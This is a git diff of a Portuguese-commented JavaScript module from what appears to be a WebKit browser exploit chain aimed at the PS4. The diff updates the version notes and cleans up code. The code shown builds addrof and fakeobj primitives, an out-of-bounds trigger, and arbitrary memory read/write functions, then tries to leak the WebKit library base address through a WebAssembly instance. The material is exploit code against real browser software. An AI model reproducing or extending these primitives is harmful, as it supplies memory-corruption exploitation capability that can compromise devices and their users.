@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v114 - R74 - Fix de Escopo addrof)
+// js/script3/testArrayBufferVictimCrash.mjs (v115 - R75 - Foco na Depuração de Nível Baixo)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Corrigido o erro de escopo 'addrof is not defined' movendo a definição das primitivas
-// addrof e fakeobj para o início da função principal, garantindo sua disponibilidade.
-// O foco principal continua sendo o vazamento de endereço base do WebKit via instância de WebAssembly.
+// Confirmado o sucesso das primitivas de L/E e da instanciação WASM.
+// A falha no vazamento persiste devido à poluição de heap, sobrepondo ponteiros críticos.
+// O script reitera a necessidade CRÍTICA de depuração de baixo nível para avançar.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -15,7 +15,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v114_R74_AddrofScopeFix";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v115_R75_CriticalDebugReq";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -54,15 +54,6 @@ function decodePS4Pointer(encoded_adv_int64) {
         logS3(`    [decodePS4Pointer] Valor de poluição detectado. Retornando como está (não é um ponteiro para decodificar).`, "warn");
         return encoded_adv_int64; // Não é um ponteiro para decodificar, é o valor de poluição
     }
-    
-    // Tentativa: Se a tag for 0x40, ou se o ponteiro parece ser de uma região de heap conhecida do PS4 (0x2a, etc.)
-    // Vamos tentar remover a tag e ver se o restante parece válido.
-    // A análise sugere que 0x40 é para objetos JS. Ponteiros WASM podem ter outras tags ou ser brutos.
-    // Se o ponteiro já for um endereço virtual alto (como 0x4xxxxxxx_xxxxxxxx), não decodificaríamos com a base do heap,
-    // apenas removeríamos a tag se houvesse uma.
-    // Com base nos logs anteriores onde o `addrof` do WASM retornou 0x402a..., vamos assumir que o `encoded_adv_int64`
-    // já é o endereço virtual e a tag está nos bits mais significativos.
-    // Então, basta remover a tag.
     
     // Reconstruímos o ponteiro sem a tag.
     return new AdvancedInt64(low_word, address_high_part);
@@ -161,7 +152,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             throw new Error(`Falha na alocação Pioneira de WebAssembly: ${wasm_e.message}`);
         }
         
-        // --- FASE 2: Obtenção de Primitivas OOB ---
+        // --- FASE 2: Obtendo primitivas OOB ---
         logS3("--- FASE 2: Obtendo primitivas OOB... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
         if (!getOOBDataView()) {
@@ -172,18 +163,18 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
         logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
         const leaker = { obj_prop: null, val_prop: 0 };
-        const leaker_addr = addrof(leaker); // Usar global addrof
+        const leaker_addr = addrof(leaker);
         
         const arb_read_final = (addr) => {
             logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
-            leaker.obj_prop = fakeobj(addr); // Usar global fakeobj
+            leaker.obj_prop = fakeobj(addr);
             const result = doubleToInt64(leaker.val_prop);
             logS3(`    arb_read_final: Lido ${result.toString(true)} de ${addr.toString(true)}`, "debug");
             return result;
         };
         const arb_write_final = (addr, value) => {
             logS3(`    arb_write_final: Preparando para escrever ${value.toString(true)} em ${addr.toString(true)}`, "debug");
-            leaker.obj_prop = fakeobj(addr); // Usar global fakeobj
+            leaker.obj_prop = fakeobj(addr);
             leaker.val_prop = int64ToDouble(value);
             logS3(`    arb_write_final: Escrita concluída em ${addr.toString(true)}`, "debug");
         };
@@ -195,7 +186,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         
         // Poluição de uma região de heap separada para o teste de L/E
         const safe_test_region_array = new Array(100); // Cria um array em uma região separada
-        const safe_test_region_addr = addrof(safe_test_region_array); // Usar global addrof
+        const safe_test_region_addr = addrof(safe_test_region_array);
         logS3(`  Endereço da região segura para teste L/E: ${safe_test_region_addr.toString(true)}`, "info");
         
         // Escreve o valor de poluição na região segura para teste L/E
